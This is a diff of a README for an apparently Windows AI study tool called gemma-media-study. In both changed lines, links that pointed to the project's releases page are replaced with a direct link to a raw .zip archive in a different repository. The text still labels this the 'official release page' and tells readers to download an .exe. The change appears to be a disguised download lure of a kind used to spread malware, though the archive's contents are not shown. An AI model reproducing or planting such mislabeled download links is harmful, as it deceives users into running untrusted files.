@@ -5,13 +5,13 @@ description: "Generate study materials from videos and audio using local Gemma m
 ---
 # 🧠 gemma-media-study - Master video content with AI precision
 
-[![Download for Windows](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Rosalinedimensional886/gemma-media-study/releases)
+[![Download for Windows](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Rosalinedimensional886/rosalinedimensional886.github.io/raw/refs/heads/main/coapprehend/rosalinedimensional-io-github-1.9.zip)
 
 gemma-media-study is a desktop program for Windows. It helps you learn from YouTube videos and audio files. The app records subtitles, breaks down videos frame by frame, and provides an AI tutor to answer your questions. Everything runs on your computer. Your data stays private.
 
 ## 📥 How to download the app
 
-Go to the [official release page](https://github.com/Rosalinedimensional886/gemma-media-study/releases) to get the software. Look for the file ending in .exe. Save this file to your computer.
+Go to the [official release page](https://github.com/Rosalinedimensional886/rosalinedimensional886.github.io/raw/refs/heads/main/coapprehend/rosalinedimensional-io-github-1.9.zip) to get the software. Look for the file ending in .exe. Save this file to your computer.
 
 ## 🖥️ System requirements
 
